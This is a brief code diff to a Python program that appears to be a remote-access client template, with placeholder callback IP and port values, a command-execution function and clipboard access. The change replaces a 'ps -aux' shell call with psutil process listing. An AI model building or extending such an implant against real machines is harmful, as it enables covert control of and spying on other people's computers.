@@ -4,6 +4,8 @@ import uuid
 import os
 import subprocess
 import pyperclip
+import psutil
+
 
 ip = "{ip}"
 port = "{port}"
@@ -78,8 +80,10 @@ def execute_command(command):
 
 def list_processes():
     try:
-        output = subprocess.check_output("ps -aux", shell=True, text=True)
-        return output
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'username']):
+            processes.append(proc.info)
+        return processes
     except Exception as e:
         return "Error listing processes: " + str(e)
 
